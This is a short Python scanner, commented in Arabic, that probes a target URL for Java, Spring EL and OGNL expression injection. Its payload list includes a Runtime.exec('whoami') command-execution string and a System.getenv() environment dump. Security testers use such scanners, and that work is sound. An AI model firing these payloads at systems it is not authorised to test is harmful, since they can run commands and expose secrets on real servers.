"""
Expression Language Injection Scanner
يفحص: Java EL, Spring EL, OGNL
"""

import requests
import urllib.parse
from typing import List, Dict

class ExpressionInjectionScanner:
    
    def __init__(self, target: str):
        self.target = target
        self.vulnerabilities = []
        
        # Payloads
        self.payloads = [
            "${7*7}",
            "#{7*7}",
            "%{7*7}",
            "${sessionScope}",
            "${applicationScope}",
            "#{T(java.lang.Runtime).getRuntime().exec('whoami')}",
            "${T(java.lang.System).getenv()}",
        ]
    
    def scan(self) -> List[Dict]:
        """الفحص الرئيسي"""
        print(f"[+] فحص Expression Injection: {self.target}")
        
        for payload in self.payloads:
            try:
                url = f"{self.target}?expr={urllib.parse.quote(payload)}"
                response = requests.get(url, timeout=10)
                
                # فحص إذا تم تنفيذ 7*7 = 49
                if '49' in response.text and '7*7' in payload:
                    self.vulnerabilities.append({
                        'type': 'Expression Language Injection',
                        'severity': 'high',
                        'url': url,
                        'payload': payload,
                        'evidence': response.text[:200]
                    })
                    print(f"  [!] Expression Injection وُجدت! Payload: {payload}")
                    return self.vulnerabilities
                
                # فحص أنماط أخرى
                indicators = ['sessionScope', 'applicationScope', 'java.lang', 'Runtime']
                if any(ind in response.text for ind in indicators):
                    self.vulnerabilities.append({
                        'type': 'Expression Language Injection',
                        'severity': 'high',
                        'url': url,
                        'payload': payload,
                        'evidence': response.text[:200]
                    })
                    print(f"  [!] Expression Injection وُجدت!")
                    return self.vulnerabilities
                    
            except:
                pass
        
        return self.vulnerabilities
